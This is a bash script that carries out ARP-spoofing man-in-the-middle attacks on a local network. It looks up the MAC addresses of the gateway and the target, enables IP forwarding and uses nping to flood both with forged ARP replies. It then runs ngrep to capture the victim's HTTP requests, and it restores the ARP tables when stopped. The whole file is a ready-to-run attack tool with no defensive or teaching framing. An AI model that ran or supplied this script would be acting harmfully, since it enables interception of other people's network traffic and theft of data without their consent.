#!/bin/bash

target_ip=$1
interface=eth0


red='\033[0;31m'
blue='\033[0;34m'
cyan='\033[0;36m'
BCyan='\033[1;36m'
yellow='\033[0;33m'
green='\033[0;32m'
clear='\033[0m'




if [ -z $target_ip ] ;then
    echo -e "${yellow}Usage: ./arpspoofing.sh 10.0.0.2 ${clear}"
    exit 0
fi

#checking machine is Up or Not
ping -c 1 $target_ip > /dev/null

if [ $? -ne 0 ]; then
    echo -e "{!} Host is not up${clear} ${yellow}Please Check it 🤷🏻‍♀️ ${clear}!. "
    exit;
fi



extracting_ip_and_mac() {

gateway_ip=$(route -n | awk -F " " {'print $2'} | grep -iE "\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}\b" | grep -v "0.0.0.0")

if [ $? -ne 0 ]; then
    echo "{!} Can't extract the ip of gateway. "
    exit;
fi

my_mac=$(ifconfig ${interface} | egrep -o ".{2}:.{2}:.{2}:.{2}:.{2}:.{2}") 

if [ $? -ne 0 ]; then
    echo "{!} Can't extract my Mac address. "
    exit;
fi

taregt_mac=$(nmap -T4 -sn $target_ip | egrep -o ".{2}:.{2}:.{2}:.{2}:.{2}:.{2}" | sort -u)

if [ $? -ne 0 ]; then
    echo "{!} Can't extract my taregt_mac address. "
    exit;
fi

gateway_mac=$(nmap -T4 -sn $gateway_ip |  grep -i "Mac Address" | egrep -o ".{2}:.{2}:.{2}:.{2}:.{2}:.{2}")

if [ $? -ne 0 ]; then
    echo "{!} Can't extract my gateway_mac address. "
    exit 0
fi

}

# 😈

restoring() {

kill -9 $GET_PID_First
kill -9 $GET_PID_Second
kill -9 $ngrep_pid

echo -e "\n\n"

echo -e "${green}{^}${clear} Resotring ${red}ARP${clear} Tables . . ✨"

echo 0 > /proc/sys/net/ipv4/ip_forward
nping --arp --arp-type ARP-reply --arp-sender-ip $gateway_ip --arp-sender-mac $gateway_mac --dest-mac $taregt_mac  $target_ip -c 10 --quiet &
nping --arp --arp-type ARP-reply --arp-sender-ip $target_ip --arp-sender-mac $taregt_mac --dest-mac $gateway_mac  $gateway_ip -c 10 --quiet &
sleep 5;

if [ $? -ne 0 ];then
    echo -e "${red}{-} Problem Happen at the time of restoring ARP Table 😵‍💫${clear}"
    exit 0
fi

}



spoofing() {

echo -e "${BCyan}{^}${clear} We're Starting ${BCyan}ARP Poisening 😈 ${clear}\n"

echo 1 > /proc/sys/net/ipv4/ip_forward

nping --arp --arp-type ARP-reply --arp-sender-ip $gateway_ip --arp-sender-mac $my_mac --dest-mac $taregt_mac  $target_ip -c 99999 --quiet & GET_PID_First=$!

if [ $? -ne 0 ];then
    echo "${red}{-} nping not running Properly 😵‍💫${clear}"
    exit 0

fi

nping --arp --arp-type ARP-reply --arp-sender-ip ${target_ip} --arp-sender-mac ${my_mac} --dest-mac ${gateway_mac}  ${gateway_ip} -c 99999 --quiet &GET_PID_Second=$!

if [ $? -ne 0 ];then
    echo "${red}{-} nping not running Properly 😵‍💫${clear}"
    exit 0

fi

ngrep -q '^GET /|POST /|HEAD /| PUT /| OPTIONS /| DELETE /| PATCH .* HTTP/1.1' host ${target_ip} -W byline & ngrep_pid=$! 

# ngrep -q '^GET /|POST /|HEAD /| PUT /| OPTIONS /| DELETE /| PATCH .* HTTP/1.1' -W byline & ngrep_pid=$! 


if [ $? -ne 0 ];then
    echo "${red}{-} Ngrep not running Properly 😵‍💫${clear}"
    exit 0

fi

echo -e "${blue}[?] Press any key to${clear} ${red}stop ✋${clear} \n"
read -n 1
restoring

}


extracting_ip_and_mac
spoofing

# nping --arp --arp-type ARP-reply --arp-sender-ip 192.168.204.2 --arp-sender-mac "00:0c:29:c3:2a:bd" --dest-mac "00:0c:29:f0:e7:f5" 192.168.204.135 -c 99999 --quiet & GET_PID_First=$!
